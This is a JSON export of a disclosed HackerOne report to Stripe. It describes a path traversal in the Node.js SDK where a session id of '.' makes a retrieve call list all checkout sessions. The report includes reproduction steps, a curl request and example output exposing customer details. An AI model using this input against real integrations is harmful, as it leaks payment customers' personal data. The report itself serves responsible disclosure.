{
  "id": 1575014,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTc1MDE0",
  "url": "https://hackerone.com/reports/1575014",
  "title": "Limited path traversal in Node.js SDK leads to PII disclosure",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-05-18T21:15:20.734Z",
  "submitted_at": "2022-05-18T21:15:20.826Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "zerodivisi0n",
    "url": "/zerodivisi0n",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/122/196/a369710e8a3ed9beee39a65be884e49e57a9fb13_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 50933,
    "url": "https://hackerone.com/stripe",
    "handle": "stripe",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/oje0985ewr1z66rlzofs2fjfda8y/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22stripe-s.png%22%3B%20filename%2A%3DUTF-8%27%27stripe-s.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142553Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c76d7fe4930d9118ad4f4eb9c1166a3431831b485ade437345bae4dd2f702bb4",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/oje0985ewr1z66rlzofs2fjfda8y/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22stripe-s.png%22%3B%20filename%2A%3DUTF-8%27%27stripe-s.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142553Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f2608c66e5577ba6e1135a695e83c6eccf4a21aa0c51f37495de01c1af2df153"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Stripe",
      "twitter_handle": "stripe",
      "website": "https://stripe.com",
      "about": "Stripe is a technology company that builds economic infrastructure for the internet."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2023-10-10T10:00:06.157Z",
  "bug_reporter_agreed_on_going_public_at": "2023-09-27T19:54:49.346Z",
  "team_member_agreed_on_going_public_at": "2023-10-10T10:00:06.052Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nIt is possible to use `.` and `..` as identifier in all API methods, which leads to calling the parent api method.\nNext, I will describe the problem using checkout sessions as an example,  because it is the most basic one. However, other methods are also vulnerable to this problem.\nFor example, using `.` as checkout session id in [Retrieve a Session](https://stripe.com/docs/api/checkout/sessions/retrieve) method leads to call [List all Checkout Sessions](https://stripe.com/docs/api/checkout/sessions/list) method.\nThe problem arises because the Node.js http implementation automatically normalizes the path, so request `https://api.stripe.com/v1/checkout/sessions/.` will normalize to `https://api.stripe.com/v1/checkout/sessions/`.\nI checked other SDKs and it looks like the problem is only in the Node.js SDK.\n\n## Steps To Reproduce:\nFor ease of reproduction, let's create a project using [accept-a-payment](https://github.com/stripe-samples/accept-a-payment) sample template.\n\n  1. Register Stripe account and obtain `STRIPE_SECRET_KEY`\n  1. Create sample project using Stripe docker cli: `docker run --rm -it -v $(pwd):/samples -w /samples stripe/stripe-cli:latest samples create accept-a-payment`\n  1. Choose `prebuilt-checkout-page` integration, `html` client and `node` server.\n  1. Create `.env` file in `accept-a-payment/server` directory with contents:\n    ```\n    STRIPE_SECRET_KEY=xxx\n    STATIC_DIR=/app/client\n    DOMAIN=http://localhost:4242\n    ```\n  1. Run another docker container with nodejs: `run -it --rm -v $(pwd)/accept-a-payment:/app -w /app/server -p 4242:4242 node bash`\n  1. Install dependencies: `npm install`\n  1. Start the server: `node server.js`\n  1. Open web page in browser and complete the payment: `http://localhost:4242`\n  1. Send curl request in terminal: `curl \"http://localhost:4242/checkout-session?sessionId=.\" | jq` (this request does not require any authentication and returns PII of all successful payments).\n\nExample output:\n```json\n{                                                                                                                                                                                                                  \n  \"object\": \"list\",                                                                                                                                                                                                \n  \"data\": [                                                                                                                                                                                                        \n    {                                                                                                                                                                                                              \n      \"id\": \"cs_test_a14L46PUF4tbXhcFrVU4Zv42kBQD2Hw5TIR6XdNHPJFckllG1Un4MztwlF\",                                                                                                                                  \n      \"object\": \"checkout.session\",                                                                                                                                                                                \n      \"after_expiration\": null,                                                                                                                                                                                    \n      \"allow_promotion_codes\": null,                                                                                                                                                                               \n      \"amount_subtotal\": 500,                                                                                                                                                                                      \n      \"amount_total\": 500,                                                                                                                                                                                         \n      \"automatic_tax\": {                                                                                                                                                                                           \n        \"enabled\": false,                                                                                                                                                                                          \n        \"status\": null                                                                                                                                                                                             \n      },                                                                                                                                                                                                           \n      \"billing_address_collection\": null,                                                                                                                                                                          \n      \"cancel_url\": \"http://localhost:4242/canceled.html\",                                                                                                                                                         \n      \"client_reference_id\": null,                                                                                                                                                                                 \n      \"consent\": null,                                                                                                                                                                                             \n      \"consent_collection\": null,                                                                                                                                                                                  \n      \"currency\": \"usd\",                                                                                                                                                                                           \n      \"customer\": \"cus_LiJwdI9LfI4c9k\",                                                                                                                                                                            \n      \"customer_creation\": \"always\",                                                                                                                                                                               \n      \"customer_details\": {                                                                                                                                                                                        \n        \"address\": {                                                                                     \n          \"city\": null,                                                                                  \n          \"country\": \"RU\",\n          \"line1\": null,\n          \"line2\": null,\n          \"postal_code\": null,\n          \"state\": null                                                                                  \n        },                         \n        \"email\": \"zerodivisi0n@wearehackerone.com\",\n        \"name\": \"BB Tester\",        \n        \"phone\": null,       \n        \"tax_exempt\": \"none\",\n        \"tax_ids\": []   \n      }\n      \"customer_email\": null,                                                                                                                                                                                      \n      \"expires_at\": 1652991126,                                                                                                                                                                                    \n      \"livemode\": false,                                                                                                                                                                                           \n      \"locale\": null,                                                                                                                                                                                              \n      \"metadata\": {                                                                                                                                                                                                \n      },                                                                                                                                                                                                           \n      \"mode\": \"payment\",                                                                                                                                                                                           \n      \"payment_intent\": \"pi_3L0tE3DrJVF2EnNj1zw13o1n\",                                                                                                                                                             \n      \"payment_link\": null,                                                                                                                                                                                        \n      \"payment_method_options\": {                                                                                                                                                                                  \n      },                                                                                                                                                                                                           \n      \"payment_method_types\": [                                                                                                                                                                                    \n        \"card\"                                                                                                                                                                                                     \n      ],                                                                                                                                                                                                           \n      \"payment_status\": \"paid\",                                                                                                                                                                                    \n      \"phone_number_collection\": {                                                                                                                                                                                 \n        \"enabled\": false                                                                                                                                                                                           \n      },                                                                                                                                                                                                           \n      \"recovered_from\": null,                                                                                                                                                                                      \n      \"setup_intent\": null,                                                                                                                                                                                        \n      \"shipping\": null,                                                                                                                                                                                            \n      \"shipping_address_collection\": null,                                                                                                                                                                         \n      \"shipping_options\": [                                                                                                                                                                                        \n                                                                                                                                                                                                                   \n      ],                                                                                                                                                                                                           \n      \"shipping_rate\": null,                                                                                                                                                                                       \n      \"status\": \"complete\",                                                                                                                                                                                        \n      \"submit_type\": null,                                                                                                                                                                                         \n      \"subscription\": null,                                                                                                                                                                                        \n      \"success_url\": \"http://localhost:4242/success.html?session_id={CHECKOUT_SESSION_ID}\",                                                                                                                        \n      \"total_details\": {                                                                                                                                                                                           \n        \"amount_discount\": 0,                                                                                                                                                                                      \n        \"amount_shipping\": 0,                                                                                                                                                                                      \n        \"amount_tax\": 0                                                                                                                                                                                            \n      },                                                                                                                                                                                                           \n      \"url\": null                                                                                                                                                                                                  \n    }                                                                                                                                                                                                              \n  ],                                                                                                                                                                                                               \n  \"has_more\": false,                                                                                                                                                                                               \n  \"url\": \"/v1/checkout/sessions\"\n}\n```\n\nIn my example, only one session is returned, but in reality all current user sessions will be returned there.\nI understand that this is only sample code and there may be more reliable implementations in production. However, such a sample code is usually used as a reference and I think that protection against this kind of attacks should be at the SDK level.\n\n## Impact\n\nThe attacker can periodically call this method and grab PII, such as user's email address, name and address.",
  "bounty_amount": "1000.0",
  "formatted_bounty": "$1,000",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 13,
  "voters": [
    "mr-medi",
    "shreyaschavhan",
    "n1m0",
    "zy9ard3",
    "shubham_srt",
    "nightm4re",
    "kerolesmagdy",
    "eminf",
    "shivammusic",
    "binary0101devil",
    "and 3 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.9,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 61184,
    "asset_type": "OTHER",
    "asset_identifier": "Stripe SDKs",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
